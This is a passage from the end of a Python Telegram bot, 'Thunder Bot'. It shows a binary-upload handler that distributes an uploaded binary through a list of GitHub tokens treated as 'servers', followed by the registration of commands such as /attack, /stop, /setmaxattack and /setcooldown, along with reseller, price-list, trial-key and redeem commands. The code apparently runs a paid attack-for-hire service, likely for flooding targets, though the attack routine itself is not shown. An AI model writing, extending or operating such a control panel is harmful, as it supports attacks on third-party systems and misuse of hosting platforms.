        
        os.remove(file_path)
        
        message = (
            f"✅ **𝐁𝐈𝐍𝐀𝐑𝐘 𝐔𝐏𝐋𝐎𝐀𝐃 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!**\n"
            "────────────────────\n"
            f"📊 **𝐑𝐄𝐒𝐔𝐋𝐓𝐒:**\n"
            f"• ✅ Success: {success_count}\n"
            f"• ❌ Failed: {fail_count}\n"
            f"• 📊 Total: {len(github_tokens)}\n"
            "────────────────────\n"
            f"📁 **𝐅𝐢𝐥𝐞:** `{BINARY_FILE_NAME}`\n"
            f"📏 **𝐅𝐢𝐥𝐞 𝐒𝐢𝐳𝐞:** {file_size} bytes\n"
            f"⚙️ **𝐁𝐢𝐧𝐚𝐫𝐲 𝐑𝐞𝐚𝐝𝐲:** ✅"
        )
        
        await progress_msg.edit_text(message)
        
    except Exception as e:
        await progress_msg.edit_text(f"❌ **𝐄𝐑𝐑𝐎𝐑**\n────────────────────\n{str(e)}")
    
    return ConversationHandler.END

async def cancel_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ **𝐁𝐈𝐍𝐀𝐑𝐘 𝐔𝐏𝐋𝐎𝐀𝐃 𝐂𝐀𝐍𝐂𝐄𝐋𝐋𝐄𝐃**\n────────────────────")
    return ConversationHandler.END

# ========== MESSAGE HANDLER ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Only respond to commands, not to regular messages
    if update.message and update.message.text and update.message.text.startswith('/'):
        # Let command handlers handle it
        return
    
    # Don't auto-reply to regular messages
    pass

# ========== MAIN FUNCTION ==========
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add conversation handlers
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    conv_handler_broadcast = ConversationHandler(
        entry_points=[CommandHandler('broadcast', broadcast_command)],
        states={
            WAITING_FOR_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message_handler),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    # Add all command handlers
    application.add_handler(conv_handler_binary)
    application.add_handler(conv_handler_broadcast)
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("admin", admin_command))  # New admin command
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    # New group management commands
    application.add_handler(CommandHandler("approvegroup", approvegroup_command))
    application.add_handler(CommandHandler("removegroup", removegroup_command))
    application.add_handler(CommandHandler("grouplist", grouplist_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("approveuserslist", approveuserslist_command))
    application.add_handler(CommandHandler("ownerlist", ownerlist_command))
    application.add_handler(CommandHandler("adminlist", adminlist_command))
    application.add_handler(CommandHandler("resellerlist", resellerlist_command))
    application.add_handler(CommandHandler("pricelist", pricelist_command))
    application.add_handler(CommandHandler("resellerpricelist", resellerpricelist_command))
    application.add_handler(CommandHandler("listgrp", listgrp_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CommandHandler("gentrailkey", gentrailkey_command))
    application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))
    
    # Owner management
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    
    # Reseller management
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    
    # Token management
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    
    # Photo handler for feedback
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    # Handle other messages (no auto-reply)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 **𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆...**")
    print("────────────────────")
    print(f"👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑𝐒: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 𝐒𝐄𝐂𝐎𝐍𝐃𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑𝐒: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑𝐒: {len(approved_users)}")
    print(f"💰 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒: {len(resellers)}")
    print(f"🔑 𝐒𝐄𝐑𝐕𝐄𝐑𝐒: {len(github_tokens)}")
    print(f"🔧 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍: {COOLDOWN_DURATION}s")
    print(f"⚡ 𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊𝐒: {MAX_ATTACKS}")
    print(f"👥 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒: {len(approved_groups)}")
    print("────────────────────")
    print("✅ 𝐆𝐑𝐎𝐔𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 𝐄𝐍𝐀𝐁𝐋𝐄𝐃: All members in approved groups can use bot!")
    print("📱 𝐃𝐌 𝐀𝐂𝐂𝐄𝐒𝐒: Only approved users can use bot in private chats")
    print("────────────────────")
    
    application.run_polling()

if __name__ == '__main__':
    main()
